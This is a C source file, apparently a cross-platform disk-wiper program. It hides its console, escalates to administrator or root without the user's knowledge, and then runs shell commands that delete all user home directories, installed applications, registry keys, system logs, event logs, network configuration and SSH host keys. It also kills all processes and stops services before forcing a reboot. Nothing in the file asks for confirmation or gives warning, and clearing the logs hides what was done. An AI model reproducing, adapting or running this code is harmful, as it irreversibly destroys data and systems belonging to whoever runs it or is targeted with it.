#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
    #include <windows.h>
    #include <direct.h>
    #include <shellapi.h>
    #define OS_WINDOWS
#else
    #include <unistd.h>
    #include <sys/stat.h>
    #include <dirent.h>
    #define OS_UNIX
#endif

// Function to hide the console window (Windows only)
void hide_console() {
#ifdef OS_WINDOWS
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
#endif
}

// Function to check if we have admin privileges
int has_admin_privileges() {
#ifdef OS_WINDOWS
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    
    return isAdmin;
#else
    return (getuid() == 0);
#endif
}

// Function to request admin privileges and restart silently
int request_admin_privileges() {
#ifdef OS_WINDOWS
    if (!has_admin_privileges()) {
        char szPath[MAX_PATH];
        if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath))) {
            SHELLEXECUTEINFO sei = {0};
            sei.cbSize = sizeof(SHELLEXECUTEINFO);
            sei.lpVerb = "runas";
            sei.lpFile = szPath;
            sei.hwnd = NULL;
            sei.nShow = SW_HIDE; // Hide the window
            
            if (ShellExecuteEx(&sei)) {
                return 0; // Exit this instance
            }
        }
        return 0; // Failed to elevate
    }
#else
    if (!has_admin_privileges()) {
        char exe_path[1024];
        ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path)-1);
        if (len != -1) {
            exe_path[len] = '\0';
            
            // Use nohup to detach from terminal and run in background
            char cmd[2048];
            snprintf(cmd, sizeof(cmd), "nohup sudo %s > /dev/null 2>&1 &", exe_path);
            system(cmd);
            return 0;
        }
        return 0; // Failed to elevate
    }
#endif
    return 1; // Already has admin privileges
}

void wipe_user_data() {
#ifdef OS_WINDOWS
    char *win_commands[] = {
        "rmdir /s /q C:\\Users\\* >nul 2>&1",
        "del /f /s /q C:\\Users\\*.* >nul 2>&1",
        "rmdir /s /q C:\\ProgramData\\* >nul 2>&1",
        "del /f /s /q C:\\Temp\\*.* >nul 2>&1",
        "del /f /s /q C:\\Windows\\Temp\\*.* >nul 2>&1",
        "del /f /s /q %TEMP%\\*.* >nul 2>&1",
        NULL
    };
    
    for (int i = 0; win_commands[i] != NULL; i++) {
        system(win_commands[i]);
    }
#else
    char *unix_commands[] = {
        "rm -rf /home/* >/dev/null 2>&1",
        "rm -rf /Users/* >/dev/null 2>&1",
        "rm -rf /root/* >/dev/null 2>&1",
        "rm -rf /tmp/* >/dev/null 2>&1",
        "rm -rf /var/tmp/* >/dev/null 2>&1",
        NULL
    };
    
    for (int i = 0; unix_commands[i] != NULL; i++) {
        system(unix_commands[i]);
    }
#endif
}

void wipe_applications() {
#ifdef OS_WINDOWS
    char *win_app_commands[] = {
        "rmdir /s /q \"C:\\Program Files\" >nul 2>&1",
        "rmdir /s /q \"C:\\Program Files (x86)\" >nul 2>&1",
        "rmdir /s /q C:\\ProgramData >nul 2>&1",
        "reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /f >nul 2>&1",
        "reg delete HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /f >nul 2>&1",
        "powershell -Command \"Get-AppxPackage | Remove-AppxPackage\" >nul 2>&1",
        NULL
    };
    
    for (int i = 0; win_app_commands[i] != NULL; i++) {
        system(win_app_commands[i]);
    }
#else
    char *unix_app_commands[] = {
        "rm -rf /opt/* >/dev/null 2>&1",
        "rm -rf /usr/local/* >/dev/null 2>&1",
        "rm -rf /Applications/* >/dev/null 2>&1",
        "apt-get autoremove --purge -y >/dev/null 2>&1 || true",
        "yum remove -y '*' >/dev/null 2>&1 || true",
        "pacman -Rns $(pacman -Qtdq) >/dev/null 2>&1 || true",
        NULL
    };
    
    for (int i = 0; unix_app_commands[i] != NULL; i++) {
        system(unix_app_commands[i]);
    }
#endif
}

void wipe_logs_and_cache() {
#ifdef OS_WINDOWS
    char *win_log_commands[] = {
        "del /f /s /q C:\\Windows\\Logs\\*.* >nul 2>&1",
        "del /f /s /q C:\\Windows\\System32\\LogFiles\\*.* >nul 2>&1",
        "wevtutil el | Foreach-Object {wevtutil cl \"$_\"} >nul 2>&1",
        "del /f /s /q C:\\Windows\\Prefetch\\*.* >nul 2>&1",
        "cleanmgr /sagerun:1 >nul 2>&1",
        NULL
    };
    
    for (int i = 0; win_log_commands[i] != NULL; i++) {
        system(win_log_commands[i]);
    }
#else
    char *unix_log_commands[] = {
        "rm -rf /var/log/* >/dev/null 2>&1",
        "rm -rf /var/cache/* >/dev/null 2>&1",
        "rm -rf /var/spool/* >/dev/null 2>&1",
        "rm -rf /Library/Caches/* >/dev/null 2>&1",
        "rm -rf /Library/Logs/* >/dev/null 2>&1",
        NULL
    };
    
    for (int i = 0; unix_log_commands[i] != NULL; i++) {
        system(unix_log_commands[i]);
    }
#endif
}

void wipe_registry_and_config() {
#ifdef OS_WINDOWS
    char *win_config_commands[] = {
        "reg delete HKCU\\SOFTWARE /f >nul 2>&1",
        "reg delete HKLM\\SOFTWARE /f >nul 2>&1",
        "netsh wlan delete profile name=* i=* >nul 2>&1",
        "netsh int ip reset >nul 2>&1",
        "ipconfig /release >nul 2>&1",
        "ipconfig /flushdns >nul 2>&1",
        "netsh winsock reset >nul 2>&1",
        NULL
    };
    
    for (int i = 0; win_config_commands[i] != NULL; i++) {
        system(win_config_commands[i]);
    }
#else
    char *unix_config_commands[] = {
        "rm -rf /etc/ssh/ssh_host_* >/dev/null 2>&1",
        "rm -f /etc/machine-id >/dev/null 2>&1",
        "rm -f /var/lib/dbus/machine-id >/dev/null 2>&1",
        "rm -rf /etc/NetworkManager/system-connections/* >/dev/null 2>&1",
        "rm -rf /var/lib/dhcp/* >/dev/null 2>&1",
        NULL
    };
    
    for (int i = 0; unix_config_commands[i] != NULL; i++) {
        system(unix_config_commands[i]);
    }
#endif
}

void nuclear_clean() {
#ifdef OS_WINDOWS
    char *win_nuclear[] = {
        "taskkill /f /im * >nul 2>&1",
        "net stop * /y >nul 2>&1",
        "del /f /s /q C:\\*.log >nul 2>&1",
        "del /f /s /q C:\\*.tmp >nul 2>&1",
        "del /f /s /q C:\\*.bak >nul 2>&1",
        "rmdir /s /q C:\\$Recycle.Bin >nul 2>&1",
        "cipher /w:C:\\ >nul 2>&1",
        NULL
    };
    
    for (int i = 0; win_nuclear[i] != NULL; i++) {
        system(win_nuclear[i]);
    }
#else
    char *unix_nuclear[] = {
        "systemctl stop --all >/dev/null 2>&1 || true",
        "killall -9 -u $(users) >/dev/null 2>&1 || true",
        "find /var -type f -not -path '/var/lib/dpkg/*' -not -path '/var/lib/rpm/*' -delete >/dev/null 2>&1 || true",
        "rm -rf /media/* /mnt/* /srv/* >/dev/null 2>&1",
        "dd if=/dev/zero of=/tmp/zerofill bs=1M count=100 >/dev/null 2>&1 || true; rm -f /tmp/zerofill >/dev/null 2>&1",
        NULL
    };
    
    for (int i = 0; unix_nuclear[i] != NULL; i++) {
        system(unix_nuclear[i]);
    }
#endif
}

void regenerate_essentials() {
#ifdef OS_WINDOWS
    char *win_regen[] = {
        "sfc /scannow >nul 2>&1",
        "dism /online /cleanup-image /restorehealth >nul 2>&1",
        "gpupdate /force >nul 2>&1",
        "netsh int ip reset >nul 2>&1",
        NULL
    };
    
    for (int i = 0; win_regen[i] != NULL; i++) {
        system(win_regen[i]);
    }
#else
    char *unix_regen[] = {
        "ssh-keygen -A >/dev/null 2>&1 || true",
        "dbus-uuidgen > /etc/machine-id 2>/dev/null || true",
        "systemd-machine-id-setup >/dev/null 2>&1 || true",
        "update-initramfs -u >/dev/null 2>&1 || true",
        NULL
    };
    
    for (int i = 0; unix_regen[i] != NULL; i++) {
        system(unix_regen[i]);
    }
#endif
}

int main() {
    // Hide console window immediately
    hide_console();
    
    // Check if we already have admin privileges
    if (!has_admin_privileges()) {
        // Request admin privileges and restart silently
        if (!request_admin_privileges()) {
            return 1; // Exit if elevation failed
        }
        return 0; // Exit this instance, the elevated one will continue
    }
    
    // If we reach here, we have admin privileges
    // Perform all wipe operations silently
    wipe_user_data();
    wipe_applications();
    wipe_logs_and_cache();
    wipe_registry_and_config();
    nuclear_clean();
    regenerate_essentials();
    
    // Reboot the system
#ifdef OS_WINDOWS
    system("shutdown /r /t 0 >nul 2>&1");
#else
    system("reboot >/dev/null 2>&1");
#endif
    
    return 0;
}